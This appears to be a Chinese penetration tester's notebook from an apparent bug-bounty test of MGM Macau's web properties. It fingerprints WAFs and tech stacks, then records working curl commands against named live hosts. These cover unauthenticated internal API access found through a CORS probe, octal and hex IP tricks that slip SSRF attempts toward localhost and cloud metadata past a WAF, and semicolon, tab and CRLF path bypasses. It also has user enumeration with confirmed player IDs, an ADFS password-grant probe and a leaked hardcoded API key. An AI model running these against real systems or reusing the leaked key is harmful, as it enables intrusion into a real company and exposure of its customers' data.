# MGM SRC测试模式 (2026-06-05 / 2026-06-08)

## 目标资产
- 授权域名: mgm.mo, mlife.mo 及子域
- 排除: mobile-museum, admin-museum, museumguiding, admin-museumguiding, api-museum, oss-museum
- 122子域，34存活

## 防护层识别
| 防护 | 目标 | 特征 |
|------|------|------|
| Tengine WAF | app/jobs/static/training | 405全封，CORS反射Origin+ACAC=true |
| Akamai Bot Manager | tickets.mgm.mo | 247 challenge (kramericaindustries.ac.lib.js) |
| 阿里云WAF | mlife.mo, macau2049 | Request Rejected, aliyungf_tc/acw_tc cookie |
| 腾讯云WAF | booking.mgm.mo | 403, X-WAF-UUID, api.waf.qq.com反馈 |
| Azure AD SSO | ra.mgm.mo, webmail.mgm.mo | SAML2, tenant: fb9c038c-a3e0-4254-a4a7-be229ad0c818 |
| BeyondTrust OAuth2 | support.mgm.mo | Bearer token验证 |
| F5 BIG-IP | roster.mgm.mo, carpark.mgm.mo | BigIP cookie |
| Reblaze WAF | tickets.mgm.mo子域 | rbzns cookie, 247状态码 |

## 技术栈
| 域名 | 技术栈 |
|------|--------|
| mgm.mo/www.mgm.mo | Next.js (React SSR) |
| mlife.mo | Express.js + F5 BIG-IP + AES + Alibaba CAPTCHA + Four Winds Interactive CMS |
| fanzone.mgm.mo | Laravel + Livewire + Webflow |
| booking.mgm.mo | UmiJS/Dva + nginx + 腾讯云WAF |
| carpark.mgm.mo | ASP.NET Core + ABP Framework + F5 BIG-IP |
| essprint.mgm.mo | Microsoft Teams Tab + Azure AD |
| tickets.mgm.mo | Django/Python + Akamai Bot Manager |
| support.mgm.mo | BeyondTrust Remote Support |
| macau2049.mgm.mo | Next.js + 阿里云WAF |
| adfs.mgm.mo | Microsoft ADFS |
| mgm-booking.itedigital.cn | 后端API (腾讯云CDN 106.55.126.156) |

---

## 2026-06-08 新增发现

### CORS泄露内部域名→API未授权访问 (高危)

booking.mgm.mo的OPTIONS响应泄露内部域名 `mgm-booking.itedigital.cn`，该域名API无需认证。

```bash
# Step 1: 获取内部域名
curl -sk -X OPTIONS 'https://booking.mgm.mo/api' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' -D- 2>/dev/null | grep access-control-allow-origin
# 返回: access-control-allow-origin: https://mgm-booking.itedigital.cn

# Step 2: 直接访问内部域名API (无需认证)
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/dropdown/dropdowns' -H 'Content-Type: application/json' -d '{}'
# 返回: 141KB下拉选项数据

curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/locale/get' -H 'Content-Type: application/json' -d '{}'
# 返回: 66KB多语言数据

curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/rateAndRoom/filter/get' -H 'Content-Type: application/json' -d '{}'
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/rateAndRoom/specialRequest/get' -H 'Content-Type: application/json' -d '{}'

# Step 3: Mlife API端点 (返回500但确认存在)
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/Mlife/mlifeToken' -H 'Content-Type: application/json' -d '{}'
curl -sk -X POST 'https://mgm-booking.itedigital.cn/api/Mlife/PatronInfos' -H 'Content-Type: application/json' -d '{}'
```

**教训**: OPTIONS预检请求的CORS响应头可能泄露内部域名，内部域名API可能无认证。

### 阿里云WAF八进制/十六进制IP绕过 (高危)

```bash
# 标准IP被WAF拦截 → Request Rejected
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://127.0.0.1/'

# 八进制IP绕过WAF → 应用层错误(FWI0002)
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://0177.0.0.1/'

# 十六进制IP绕过
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://0x7f.0.0.1/'

# 云元数据地址绕过 (169.254.169.254 的八进制)
curl -sk 'https://Mlife.mo/FourWindsIntegration/OpenIntegration/GetFromUrl.ashx?Connection=DEV&Url=http://0251.0376.0245.0234/latest/meta-data/'
```

**注意**: WAF绕过成功，但Connection参数无效导致SSRF未真正发出。需有效Connection值。

### FWI CMS /view/* 端点无认证数据泄露 (中危)

```bash
curl -sk 'https://Mlife.mo/view/offers'          # 15KB优惠数据
curl -sk 'https://Mlife.mo/view/accommodations'   # 2KB酒店数据(含电话邮箱)
curl -sk 'https://Mlife.mo/view/pointRedemptions' # 2KB积分兑换
curl -sk 'https://Mlife.mo/view/freeComps'        # 734B免费优惠
curl -sk 'https://Mlife.mo/view/onlineshopping'   # 1.5KB在线购物
# 泄露: 电话(853) 88021888, 邮箱hotelreservations@mgmmacau.com
```

### encryptAES256 端点无认证 (中危)

```bash
curl -sk -X POST 'https://Mlife.mo/encryptAES256' -d 'playerId=10000001&pin=1234&email=test@test.com'
# 返回: {"playerId":"+51Man5Qqz0qPJmDGuqcjA==","pin":"k2RLPNZLCodUrFrPzknswA==",...}
```

### 用户枚举 via LoginMlifeESB (中危)

```bash
# 真实用户(PIN锁定)返回不同错误
curl -sk -X POST 'https://Mlife.mo/LoginMlifeESB' -d 'playerId=11111111&pin=1234&dateOfBirthYear=1990&dateOfBirthMonth=01&dateOfBirthDay=01'
# 返回: "The PIN is locked. Please contact M life For assistance."

# 不存在用户 → "Login failed. Please proceed to M life for assistance."
# 已确认真实用户: 11111111, 66666666, 88888888 (PIN锁定)
```

### ADFS OAuth2 Password Grant (需client_id)

```bash
curl -sk -X POST 'https://adfs.mgm.mo/adfs/oauth2/token' -d 'grant_type=password&client_id=test&username=admin&password=test&scope=openid'
# 返回: {"error":"invalid_client"} (非unsupported_grant_type，说明password grant已启用)

curl -sk 'https://adfs.mgm.mo/FederationMetadata/2007-06/FederationMetadata.xml'  # 70KB含证书
curl -sk 'https://adfs.mgm.mo/adfs/.well-known/openid-configuration'              # 支持password/implicit/device_code
```

### booking.mgm.mo 前端硬编码凭据 (中危)

```bash
curl -sk 'https://booking.mgm.mo/umi.73a35b49.js' | grep -oP 'var e=\{[^}]*\}'
# 泄露: ak=Msda1wnosg12oi9OZZnO0easda0ra8eru1i23nklasjiasmdmfiasj9092=13012z201i432jr52=dasda=MGM2024
# apiServer=124.156.129.102:8444, ssl=false, env=Prod
```

### Barcode.asmx WSDL泄露+未授权调用 (中危)

```bash
curl -sk 'https://Mlife.mo/FourWindsIntegration/eHostWebservice/Barcode.asmx?WSDL'  # 8KB WSDL
curl -sk -X POST 'https://Mlife.mo/FourWindsIntegration/eHostWebservice/Barcode.asmx/GenerateCode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CodeText=MGM-VIP-2024&CodeHeight=100&CodeWidth=200&ResponseFormat=image'
# 返回: HTTP 200, image/png, ~22KB条形码
```

---

## 2026-06-05 原始发现

### SPA + WAF组合突破 — 浏览器Console API发现
booking.mgm.mo后端API被腾讯云WAF拦截(403)，curl无法直接访问。
突破方法:
```javascript
// 1. 浏览器加载SPA页面
// 2. 捕获页面加载时的API调用
performance.getEntriesByType('resource').filter(e=>e.name.includes('api')).map(e=>e.name)

// 3. 从Console直接调用API(浏览器Cookie绕过WAF)
fetch('/api/rateAndRoom/corporateCode/check', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({code:''})
}).then(r=>r.json()).then(d=>console.log(d))
// 返回: {"success":true,"data":true} ← 验证逻辑缺陷!
```

### 腾讯云WAF路径绕过
精确路径匹配，绕过方式:
- 分号: `/api/v1/config;` → 404(到达后端)
- 扩展名: `/api/v1/config.json` → 404
- Tab: `/api/v1/config%09` → 404
- CRLF: `/api/v1/config%0d%0a` → 404

### ABP Framework API枚举
carpark.mgm.mo使用ABP Framework:
```
POST /api/services/app/ScanPay/LicensePlateQuery
Body: {"ParkNo":"MC","SearchFilter":"test"}
Response: {"unAuthorizedRequest":false,"__abp":true,"error":{"message":"test No presence record"}}
```

### FourWindsIntegration ASHX端点
Connection=DEV返回OK(数据库活跃), PROD/STAGING返回FAIL。

### 内网不可达目标
pgsapi.mgm.mo, carparkapi.mgm.mo, idmelon.mgm.mo, mlife.mo:8080 — 全部超时。
